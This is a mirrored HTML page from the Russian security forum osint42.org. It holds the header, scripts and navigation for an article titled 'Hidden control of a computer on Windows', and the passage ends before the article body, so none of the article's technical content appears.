@@ -1,0 +1,3113 @@
+<!DOCTYPE html>
+<html id="XF" lang="ru-RU" dir="LTR"
+	data-xf="2.3"
+	data-app="public"
+	data-variation="alternate"
+	data-color-scheme="dark"
+	data-template="xa_ams_article_view"
+	data-container-key="amsCategory-2"
+	data-content-key=""
+	data-logged-in="false"
+	data-cookie-prefix="xf_"
+	data-csrf="1758965450,24864d601dac6d1ac956380e4d995636"
+	class="has-no-js template-xa_ams_article_view"
+	 data-run-jobs="">
+
+<!-- Mirrored from osint42.org/articles/skrytoye-upravleniye-komp-yuterom-na-windows-adovaya-stat-ya.56/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Sep 2025 09:35:09 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+	<link rel="icon" href="../../favicon.ico" type="image/x-icon">
+	
+	
+	
+
+	<meta charset="utf-8" />
+	<title>Скрытое управление компьютером на Windows, адовая статья | Osint42.Org - Безопасность и код</title>
+	<link rel="manifest" crossorigin="use-credentials" href="../../webmanifest.php">
+
+	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+
+	
+		
+			<meta name="theme-color" content="#0a1c29" />
+		
+	
+
+	<meta name="apple-mobile-web-app-title" content="Osint42.Org - Безопасность и код">
+	
+		<link rel="apple-touch-icon" href="../../data/assets/logo/192192.png">
+		
+
+	
+		
+		<meta property="og:title" content="Скрытое управление компьютером на Windows, адовая статья" />
+		<meta property="twitter:title" content="Скрытое управление компьютером на Windows, адовая статья" />
+	
+	
+		
+		<meta name="description" content="Статья не новая, нашел на старом форуме, но не плохо описано всё.
+
+Возможно какие-то команды могут устареть, но думаю есть аналоги, читайте справку, в..." />
+		<meta property="og:description" content="Статья не новая, нашел на старом форуме, но не плохо описано всё.
+
+Возможно какие-то команды могут устареть, но думаю есть аналоги, читайте справку, в остальном всё актуально должно быть.)
+
+1. Введение
+
+В этой заметке будет рассмотрен вопрос..." />
+		<meta property="twitter:description" content="Статья не новая, нашел на старом форуме, но не плохо описано всё.
+
+Возможно какие-то команды могут устареть, но думаю есть аналоги, читайте справку, в остальном всё актуально должно быть.)
+
+1..." />
+	
+	
+		<meta property="og:type" content="article" />
+	
+		<meta property="og:url" content="index.html" />
+	
+		<link rel="canonical" href="index.html" />
+	
+		
+		<meta property="og:image" content="1753193868442.png" />
+		<meta property="twitter:image" content="1753193868442.png" />
+		<meta property="twitter:card" content="summary_large_image" />
+	
+	
+
+	
+		
+	
+	
+	<meta property="og:site_name" content="Osint42.Org - Безопасность и код" />
+
+
+	
+	
+	
+	
+	
+	
+
+	
+	
+	
+		
+	
+	
+
+	<link rel="stylesheet" href="../../cssf1bd.css?css=public%3Anormalize.css%2Cpublic%3Afa.css%2Cpublic%3Avariations.less%2Cpublic%3Acore.less%2Cpublic%3Aapp.less&amp;s=1&amp;l=2&amp;d=1758392320&amp;k=650febe17d52673553ff8fcab924bc52ae7c26c5" />
+
+	<link rel="stylesheet" href="../../css002d.css?css=public%3Aalnb_navigation.less%2Cpublic%3Abb_code.less%2Cpublic%3Alightbox.less%2Cpublic%3Anotices.less%2Cpublic%3Ashare_controls.less%2Cpublic%3Axa_ams.less%2Cpublic%3Aextra.less&amp;s=1&amp;l=2&amp;d=1758392320&amp;k=f5241ce3061674c4a2bfd77343d9ccd4f3736920" />
+
+
+	
+		<script data-cfasync="false" src="../../js/xf/preamble.minf74f.js?_v=01eb82fa"></script>
+	
+
+	
+	<script data-cfasync="false" src="../../js/vendor/vendor-compiledf74f.js?_v=01eb82fa" defer></script>
+	<script data-cfasync="false" src="../../js/xf/core-compiledf74f.js?_v=01eb82fa" defer></script>
+
+	<script data-cfasync="false">
+		XF.ready(() =>
+		{
+			XF.extendObject(true, XF.config, {
+				// 
+				userId: 0,
+				enablePush: true,
+				pushAppServerKey: 'BA479YFsUh5Dh5bOkTEWM7LoORrEgUroE2adYpgA6_NLt6AmfJFBdCBxt_i9NhpAIXJviINVU4JDqWxez0NnB-w',
+				url: {
+					fullBase: 'https://osint42.org/',
+					basePath: '/',
+					css: '/css.php?css=__SENTINEL__&s=1&l=2&d=1758392320',
+					js: '/js/__SENTINEL__?_v=01eb82fa',
+					icon: '/data/local/icons/__VARIANT__.svg?v=1757401797#__NAME__',
+					iconInline: '/styles/fa/__VARIANT__/__NAME__.svg?v=5.15.3',
+					keepAlive: '/login/keep-alive'
+				},
+				cookie: {
+					path: '/',
+					domain: '',
+					prefix: 'xf_',
+					secure: true,
+					consentMode: 'disabled',
+					consented: ["optional","_third_party"]
+				},
+				cacheKey: '60356f7aa4f82ca98e605b4e87a0a057',
+				csrf: '1758965450,24864d601dac6d1ac956380e4d995636',
+				js: {"\/js\/xf\/lightbox-compiled.js?_v=01eb82fa":true,"\/js\/xf\/code_block-compiled.js?_v=01eb82fa":true,"\/js\/copycode\/copycode.min.js?_v=01eb82fa":true,"\/js\/DCom\/LiveContent\/4.4.1\/socket.io.min.js?_v=01eb82fa":true,"\/js\/DCom\/LiveContent\/socket-conv.min.js?_v=01eb82fa":true},
+				fullJs: false,
+				css: {"public:alnb_navigation.less":true,"public:bb_code.less":true,"public:lightbox.less":true,"public:notices.less":true,"public:share_controls.less":true,"public:xa_ams.less":true,"public:extra.less":true},
+				time: {
+					now: 1758965450,
+					today: 1758920400,
+					todayDow: 6,
+					tomorrow: 1759006800,
+					yesterday: 1758834000,
+					week: 1758402000,
+					month: 1756674000,
+					year: 1735678800
+				},
+				style: {
+					light: 'default',
+					dark: 'alternate',
+					defaultColorScheme: 'light'
+				},
+				borderSizeFeature: '3px',
+				fontAwesomeWeight: 'r',
+				enableRtnProtect: true,
+				
+				enableFormSubmitSticky: true,
+				imageOptimization: '0',
+				imageOptimizationQuality: 0.85,
+				uploadMaxFilesize: 3145728,
+				uploadMaxWidth: 0,
+				uploadMaxHeight: 0,
+				allowedVideoExtensions: ["m4v","mov","mp4","mp4v","mpeg","mpg","ogv","webm"],
+				allowedAudioExtensions: ["mp3","opus","ogg","wav"],
+				shortcodeToEmoji: true,
+				visitorCounts: {
+					conversations_unread: '0',
+					alerts_unviewed: '0',
+					total_unread: '0',
+					title_count: true,
+					icon_indicator: true
+				},
+				jsMt: {"xf\/action.js":"dc2375bf","xf\/embed.js":"d3d00259","xf\/form.js":"d3d00259","xf\/structure.js":"dc2375bf","xf\/tooltip.js":"d3d00259"},
+				jsState: {},
+				publicMetadataLogoUrl: 'https://osint42.org/data/assets/logo/192192.png',
+				publicPushBadgeUrl: 'https://osint42.org/styles/default/xenforo/bell.png'
+			})
+
+			XF.extendObject(XF.phrases, {
+				// 
+"svStandardLib_time.day": "{count} day",
+"svStandardLib_time.days": "{count} дней",
+"svStandardLib_time.hour": "{count} hour",
+"svStandardLib_time.hours": "{count} часов",
+"svStandardLib_time.minute": "{count} минут",
+"svStandardLib_time.minutes": "{count} минут",
+"svStandardLib_time.month": "{count} month",
+"svStandardLib_time.months": "{count} месяцев",
+"svStandardLib_time.second": "{count} second",
+"svStandardLib_time.seconds": "{count} секунд",
+"svStandardLib_time.week": "time.week",
+"svStandardLib_time.weeks": "{count} недель",
+"svStandardLib_time.year": "{count} year",
+"svStandardLib_time.years": "{count} лет",
+copy_to_clipboard: "Скопировать в буфер обмена",
+text_copied_to_clipboard: "Текст скопирован в буфер обмена.",
+				date_x_at_time_y:     "{date} в {time}",
+				day_x_at_time_y:      "{day} в {time}",
+				yesterday_at_x:       "Вчера в {time}",
+				x_minutes_ago:        "{minutes} мин. назад",
+				one_minute_ago:       "Минуту назад",
+				a_moment_ago:         "Только что",
+				today_at_x:           "Сегодня в {time}",
+				in_a_moment:          "Через секунду",
+				in_a_minute:          "Через минуту",
+				in_x_minutes:         "Через {minutes} мин.",
+				later_today_at_x:     "Сегодня в {time}",
+				tomorrow_at_x:        "Завтра в {time}",
+				short_date_x_minutes: "{minutes} м.",
+				short_date_x_hours:   "{hours} ч.",
+				short_date_x_days:    "{days} д.",
+
+				day0: "Воскресенье",
+				day1: "Понедельник",
+				day2: "Вторник",
+				day3: "Среда",
+				day4: "Четверг",
+				day5: "Пятница",
+				day6: "Суббота",
+
+				dayShort0: "Вс",
+				dayShort1: "Пн",
+				dayShort2: "Вт",
+				dayShort3: "Ср",
+				dayShort4: "Чт",
+				dayShort5: "Пт",
+				dayShort6: "Сб",
+
+				month0: "Январь",
+				month1: "Февраль",
+				month2: "Март",
+				month3: "Апрель",
+				month4: "Май",
+				month5: "Июнь",
+				month6: "Июль",
+				month7: "Август",
+				month8: "Сентябрь",
+				month9: "Октябрь",
+				month10: "Ноябрь",
+				month11: "Декабрь",
+
+				active_user_changed_reload_page: "Ваша сессия истекла. Перезагрузите страницу.",
+				server_did_not_respond_in_time_try_again: "Сервер не ответил вовремя. Пожалуйста, попробуйте снова.",
+				oops_we_ran_into_some_problems: "Упс! Мы столкнулись с некоторыми проблемами.",
+				oops_we_ran_into_some_problems_more_details_console: "Упс! Мы столкнулись с некоторыми проблемами. Пожалуйста, попробуйте позже. Более детальную информацию об ошибке Вы можете посмотреть в консоли браузера",
+				file_too_large_to_upload: "Файл слишком большой для загрузки.",
+				uploaded_file_is_too_large_for_server_to_process: "Загружаемый файл слишком большой для обработки сервером.",
+				files_being_uploaded_are_you_sure: "Файлы ещё загружаются. Вы уверены, что хотите отправить эту форму?",
+				attach: "Прикрепить файлы",
+				rich_text_box: "Текстовое поле с поддержкой форматирования",
+				close: "Закрыть",
+				link_copied_to_clipboard: "Ссылка скопирована в буфер обмена.",
+				text_copied_to_clipboard: "Текст скопирован в буфер обмена.",
+				loading: "Загрузка...",
+				you_have_exceeded_maximum_number_of_selectable_items: "Вы превысили максимальное количество выбираемых элементов.",
+
+				processing: "Обработка",
+				'processing...': "Обработка...",
+
+				showing_x_of_y_items: "Показано {count} из {total} элементов",
+				showing_all_items: "Показаны все элементы",
+				no_items_to_display: "Нет элементов для отображения",
+
+				number_button_up: "Увеличить",
+				number_button_down: "Уменьшить",
+
+				push_enable_notification_title: "Push-уведомления для сайта Osint42.Org - Безопасность и код успешно включены",
+				push_enable_notification_body: "Спасибо за включение push-уведомлений!",
+
+				pull_down_to_refresh: "Потяните вниз для обновления",
+				release_to_refresh: "Отпустите для обновления",
+				refreshing: "Обновление..."
+			})
+		})
+	
+
+window.addEventListener('DOMContentLoaded',()=>{XF.Push.updateUserSubscriptionParent=XF.Push.updateUserSubscription;XF.Push.updateUserSubscription=function(b,a){"unsubscribe"===a&&XF.browser.safari&&XF.Push.setPushHistoryUserIds({});XF.Push.updateUserSubscriptionParent(b,a)}});
+</script>
+
+	<script data-cfasync="false" src="../../js/xf/lightbox-compiledf74f.js?_v=01eb82fa" defer></script>
+<script data-cfasync="false" src="../../js/xf/code_block-compiledf74f.js?_v=01eb82fa" defer></script>
+<script data-cfasync="false" src="../../js/copycode/copycode.minf74f.js?_v=01eb82fa" defer></script>
+<script data-cfasync="false" src="../../js/DCom/LiveContent/4.4.1/socket.io.minf74f.js?_v=01eb82fa" defer></script>
+<script data-cfasync="false" src="../../js/DCom/LiveContent/socket-conv.minf74f.js?_v=01eb82fa" defer></script>
+
+
+
+	
+		<link rel="icon" type="image/png" href="../../data/assets/logo/favicon.png" sizes="32x32" />
+	
+
+	
+	
+</head>
+<body data-template="xa_ams_article_view">
+
+<div class="p-pageWrapper" id="top">
+
+	
+
+	<header class="p-header" id="header">
+		<div class="p-header-inner">
+			<div class="p-header-content">
+				<div class="p-header-logo p-header-logo--image">
+					<a href="../../forums/index.html">
+						
+
+	
+
+	
+		
+		
+
+		
+	
+		
+		
+
+		
+	
+
+	
+
+	<picture data-variations="{&quot;default&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;,&quot;2&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;},&quot;alternate&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;,&quot;2&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;}}">
+		
+		
+		
+
+		
+
+		<img src="../../data/assets/logo_alternate/osint4242.png" srcset="/data/assets/logo_alternate/osint4242.png 2x" width="100" height="36" alt="Osint42.Org - Безопасность и код"  />
+	</picture>
+
+
+					</a>
+				</div>
+
+				
+			</div>
+		</div>
+	</header>
+
+	
+	
+
+	
+		<div class="p-navSticky p-navSticky--primary" data-xf-init="sticky-header">
+			
+		<nav class="p-nav">
+			<div class="p-nav-inner">
+				<button type="button" class="button button--plain p-nav-menuTrigger" data-xf-click="off-canvas" data-menu=".js-headerOffCanvasMenu" tabindex="0" aria-label="Меню"><span class="button-text">
+					<i aria-hidden="true"></i>
+				</span></button>
+
+				<div class="p-nav-smallLogo">
+					<a href="../../forums/index.html">
+						
+
+	
+
+	
+		
+		
+
+		
+	
+		
+		
+
+		
+	
+
+	
+
+	<picture data-variations="{&quot;default&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;,&quot;2&quot;:null},&quot;alternate&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;,&quot;2&quot;:null}}">
+		
+		
+		
+
+		
+
+		<img src="../../data/assets/logo_alternate/osint4242.png"  width="100" height="36" alt="Osint42.Org - Безопасность и код"  />
+	</picture>
+
+
+					</a>
+				</div>
+
+				<div class="p-nav-scroller hScroller" data-xf-init="h-scroller" data-auto-scroll=".p-navEl.is-selected">
+					<div class="hScroller-scroll">
+						<ul class="p-nav-list js-offCanvasNavSource">
+							
+								<li>
+									
+	<div class="p-navEl is-selected" data-has-children="true">
+	
+
+		
+	
+	<a href="../../index.html"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="xa_ams">Статьи</a>
+
+
+		<a data-xf-key="1"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="../../whats-new/ams-articles/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xa_amsNewArticles">Новые статьи</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../whats-new/ams-comments/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xa_amsNewComments">Новые комментарии</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../authors/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="xa_amsAuthorList">Список авторов</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " data-has-children="true">
+	
+
+		
+	
+	<a href="../../forums/index.html"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="forums">Форум</a>
+
+
+		<a data-xf-key="2"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="../../whats-new/posts/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="newPosts">Новые сообщения</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../search/index4009.html?type=post"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="searchForums">Поиск по форуму</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " data-has-children="true">
+	
+
+		
+	
+	<a href="../../whats-new/index.html"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="whatsNew">Что нового</a>
+
+
+		<a data-xf-key="3"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="../../whats-new/posts/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="whatsNewPosts">Новые сообщения</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../whats-new/ams-articles/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xaAmsWhatsNewNewArticles">Новые статьи</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../whats-new/media/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xfmgWhatsNewNewMedia">Новые медиа</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../whats-new/ams-comments/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xaAmsWhatsNewArticleComments">Новые комментарии к статье</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " data-has-children="true">
+	
+
+		
+	
+	<a href="../../media/index.html"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="xfmg">Медиа</a>
+
+
+		<a data-xf-key="4"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="../../whats-new/media/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xfmgNewMedia">Новые медиа</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../whats-new/media-comments/index.html"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	 rel="nofollow"
+	
+	data-nav-id="xfmgNewComments">Новые комментарии</a>
+
+	
+
+				
+					
+	
+	
+	<a href="../../search/index4784.html?type=xfmg_media"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="xfmgSearchMedia">Поиск медиа</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " data-has-children="true">
+	
+
+		
+	
+	<a href="https://osint42.org/members/"
+	class="p-navEl-link p-navEl-link--splitMenu "
+	
+	
+	data-nav-id="members">Пользователи</a>
+
+
+		<a data-xf-key="5"
+			data-xf-click="menu"
+			data-menu-pos-ref="< .p-navEl"
+			class="p-navEl-splitTrigger"
+			role="button"
+			tabindex="0"
+			aria-label="Переключатель раскрытия"
+			aria-expanded="false"
+			aria-haspopup="true"></a>
+
+		
+	
+		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+			<div class="menu-content">
+				
+					
+	
+	
+	<a href="https://osint42.org/online/"
+	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
+	
+	
+	data-nav-id="currentVisitors">Сейчас на форуме</a>
+
+	
+
+				
+			</div>
+		</div>
+	
+	</div>
+
+								</li>
+							
+						</ul>
+					</div>
+				</div>
+
+				<div class="p-nav-opposite">
+					<div class="p-navgroup p-account p-navgroup--guest">
+						
+							<a href="../../login/index.html" class="p-navgroup-link p-navgroup-link--textual p-navgroup-link--logIn"
+								data-xf-click="overlay" data-follow-redirects="on">
+								<span class="p-navgroup-linkText">Вход</span>
+							</a>
+							
+								<a href="../../register/index.html" class="p-navgroup-link p-navgroup-link--textual p-navgroup-link--register"
+									data-xf-click="overlay" data-follow-redirects="on">
+									<span class="p-navgroup-linkText">Регистрация</span>
+								</a>
+							
+						
+					</div>
+					
+					
+    <a href="https://osint42.org/misc/style-variation"
+       class="p-navgroup-link p-navgroup-link--iconic js-styleVariationsLink"
+       data-xf-click="menu"
+       data-menu-pos-ref="< .p-navgroup"
+       aria-label=" Выбор стиля"
+       aria-expanded="false"
+       aria-haspopup="true"
+       title=" Выбор стиля">
+        <i aria-hidden="true">
+            <i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
+        </i>
+        <span class="p-navgroup-linkText"> Выбор стиля</span>
+    </a>
+
+    <div class="menu menu--structural" data-menu="menu" aria-hidden="true">
+        <div class="menu-content js-styleVariationsMenu">
+            
+
+	
+		
+
+	<a href="https://osint42.org/misc/style-variation?reset=1&amp;t=1758965450%2C24864d601dac6d1ac956380e4d995636"
+		class="menu-linkRow "
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="">
+
+		<i class="fa--xf far fa-adjust "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#adjust"></use></svg></i>
+
+		
+			Системный
+		
+	</a>
+
+
+		
+
+	<a href="https://osint42.org/misc/style-variation?variation=default&amp;t=1758965450%2C24864d601dac6d1ac956380e4d995636"
+		class="menu-linkRow "
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="default">
+
+		<i class="fa--xf far fa-sun "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#sun"></use></svg></i>
+
+		
+			Светлый
+		
+	</a>
+
+
+		
+
+	<a href="https://osint42.org/misc/style-variation?variation=alternate&amp;t=1758965450%2C24864d601dac6d1ac956380e4d995636"
+		class="menu-linkRow is-selected"
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="alternate">
+
+		<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
+
+		
+			Тёмный
+		
+	</a>
+
+	
+
+	
+		
+	
+
+        </div>
+    </div>
+
+
+
+					<div class="p-navgroup p-discovery">
+						<a href="../../whats-new/index.html"
+							
+
+	class="p-navgroup-link p-navgroup-link--iconic p-navgroup-link--whatsnew"
+
+							aria-label="Что нового"
+							title="Что нового">
+							<i aria-hidden="true"></i>
+							<span class="p-navgroup-linkText">Что нового</span>
+						</a>
+
+						
+							<a href="../../search/index.html"
+								class="p-navgroup-link p-navgroup-link--iconic p-navgroup-link--search"
+								data-xf-click="menu"
+								data-xf-key="/"
+								aria-label="Поиск"
+								aria-expanded="false"
+								aria-haspopup="true"
+								title="Поиск">
+								<i aria-hidden="true"></i>
+								<span class="p-navgroup-linkText">Поиск</span>
+							</a>
+							<div class="menu menu--structural menu--wide" data-menu="menu" aria-hidden="true">
+								<form action="https://osint42.org/search/search" method="post"
+									class="menu-content"
+									data-xf-init="quick-search">
+
+									<h3 class="menu-header">Поиск</h3>
+									
+									<div class="menu-row">
+										
+											<div class="inputGroup inputGroup--joined">
+												<input type="text" class="input" name="keywords" data-acurl="/search/auto-complete" placeholder="Поиск..." aria-label="Поиск" data-menu-autofocus="true" />
+												
+			<select name="constraints" class="js-quickSearch-constraint input" aria-label="Поиск в">
+				<option value="">Везде</option>
+<option value="{&quot;search_type&quot;:&quot;ams_article&quot;}">Статьи</option>
+<option value="{&quot;search_type&quot;:&quot;ams_article&quot;,&quot;c&quot;:{&quot;categories&quot;:[2],&quot;child_categories&quot;:1}}">Эта категория</option>
+
+			</select>
+		
+											</div>
+										
+									</div>
+
+									
+									<div class="menu-row">
+										<label class="iconic"><input type="checkbox"  name="c[title_only]" value="1" /><i aria-hidden="true"></i><span class="iconic-label">Искать только в заголовках
+
+													
+													<span tabindex="0" role="button"
+														data-xf-init="tooltip" data-trigger="hover focus click" title="Теги также будут учитываться">
+
+														<i class="fa--xf far fa-question-circle  u-muted u-smaller"><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Примечание</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#question-circle"></use></svg></i>
+													</span></span></label>
+
+									</div>
+									
+									<div class="menu-row">
+										<div class="inputGroup">
+											<span class="inputGroup-text" id="ctrl_search_menu_by_member">Автор:</span>
+											<input type="text" class="input" name="c[users]" data-xf-init="auto-complete" placeholder="Пользователь" aria-labelledby="ctrl_search_menu_by_member" />
+										</div>
+									</div>
+									<div class="menu-footer">
+									<span class="menu-footer-controls">
+										<button type="submit" class="button button--icon button--icon--search button--primary"><i class="fa--xf far fa-search "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#search"></use></svg></i><span class="button-text">Найти</span></button>
+										<button type="submit" class="button " name="from_search_menu"><span class="button-text">Расширенный поиск...</span></button>
+									</span>
+									</div>
+
+									<input type="hidden" name="_xfToken" value="1758965450,24864d601dac6d1ac956380e4d995636" />
+								</form>
+							</div>
+						
+					</div>
+				</div>
+			</div>
+		</nav>
+	
+		</div>
+		
+		
+			<div class="p-sectionLinks">
+				<div class="p-sectionLinks-inner hScroller" data-xf-init="h-scroller">
+					<div class="hScroller-scroll">
+						<ul class="p-sectionLinks-list">
+							
+								<li>
+									
+	<div class="p-navEl " >
+	
+
+		
+	
+	<a href="../../whats-new/ams-articles/index.html"
+	class="p-navEl-link "
+	 rel="nofollow"
+	data-xf-key="alt+1"
+	data-nav-id="xa_amsNewArticles">Новые статьи</a>
+
+
+		
+
+		
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " >
+	
+
+		
+	
+	<a href="../../whats-new/ams-comments/index.html"
+	class="p-navEl-link "
+	 rel="nofollow"
+	data-xf-key="alt+2"
+	data-nav-id="xa_amsNewComments">Новые комментарии</a>
+
+
+		
+
+		
+	
+	</div>
+
+								</li>
+							
+								<li>
+									
+	<div class="p-navEl " >
+	
+
+		
+	
+	<a href="../authors/index.html"
+	class="p-navEl-link "
+	
+	data-xf-key="alt+3"
+	data-nav-id="xa_amsAuthorList">Список авторов</a>
+
+
+		
+
+		
+	
+	</div>
+
+								</li>
+							
+						</ul>
+					</div>
+				</div>
+			</div>
+			
+	
+		
+
+	<div class="offCanvasMenu offCanvasMenu--nav js-headerOffCanvasMenu" data-menu="menu" aria-hidden="true" data-ocm-builder="navigation">
+		<div class="offCanvasMenu-backdrop" data-menu-close="true"></div>
+		<div class="offCanvasMenu-content">
+			<div class="offCanvasMenu-header">
+				Меню
+				<a class="offCanvasMenu-closer" data-menu-close="true" role="button" tabindex="0" aria-label="Закрыть"></a>
+			</div>
+			
+				<div class="p-offCanvasRegisterLink">
+					<div class="offCanvasMenu-linkHolder">
+						<a href="../../login/index.html" class="offCanvasMenu-link" data-xf-click="overlay" data-menu-close="true">
+							Вход
+						</a>
+					</div>
+					<hr class="offCanvasMenu-separator" />
+					
+						<div class="offCanvasMenu-linkHolder">
+							<a href="../../register/index.html" class="offCanvasMenu-link" data-xf-click="overlay" data-menu-close="true">
+								Регистрация
+							</a>
+						</div>
+						<hr class="offCanvasMenu-separator" />
+					
+				</div>
+			
+			<div class="js-offCanvasNavTarget"></div>
+			<div class="offCanvasMenu-installBanner js-installPromptContainer" style="display: none;" data-xf-init="install-prompt">
+				<div class="offCanvasMenu-installBanner-header">Установить приложение</div>
+				<button type="button" class="button js-installPromptButton"><span class="button-text">Установить</span></button>
+				<template class="js-installTemplateIOS">
+					<div class="js-installTemplateContent">
+						<div class="overlay-title">Как установить приложение на iOS</div>
+						<div class="block-body">
+							<div class="block-row">
+								<p>
+									Следуйте инструкциям в видео ниже, чтобы узнать, как установить наш сайт как веб-приложение на главный экран вашего устройства.
+								</p>
+								<p style="text-align: center">
+									<video src="../../styles/default/xenforo/add_to_home_new.mp4"
+										width="280" height="480" autoplay loop muted playsinline></video>
+								</p>
+								<p>
+									<small><strong>Примечание:</strong> Эта функция может быть недоступна в некоторых браузерах.</small>
+								</p>
+							</div>
+						</div>
+					</div>
+				</template>
+			</div>
+		</div>
+	</div>
+
+	<div class="p-body">
+		<div class="p-body-inner">
+			<!--XF:EXTRA_OUTPUT-->
+
+
+			
+				
+	
+		
+		
+
+		<ul class="notices notices--block  js-notices"
+			data-xf-init="notices"
+			data-type="block"
+			data-scroll-interval="6">
+
+			
+				
+	<li class="notice js-notice notice--primary notice--hasImage"
+		data-notice-id="1"
+		data-delay-duration="0"
+		data-display-duration="0"
+		data-auto-dismiss=""
+		data-visibility="">
+
+		
+			<div class="notice-image"><img src="../../data/assets/notice_images/c7eb1746-6291-4d37-b72b-8e3b5cfd1303.png" alt="" /></div>
+		
+		<div class="notice-content">
+			
+			<div class="block"
+     style="border:1px solid #ccc;
+            border-radius:8px;
+            padding:min(4vw,15px);
+            background:var(--xf-contentBg);
+            box-shadow:0 0 8px rgba(0,0,0,.1);
+            width:100%;
+            max-width:clamp(480px,90vw,1200px);
+            margin:0 auto;
+            box-sizing:border-box;
+            overflow:hidden;">
+
+  <div class="block-container">
+    <h3 class="block-header"
+        style="font-size:clamp(1rem,4vw,1.125rem);
+               margin:0 0 10px 0;">
+      📡 Наши контакты
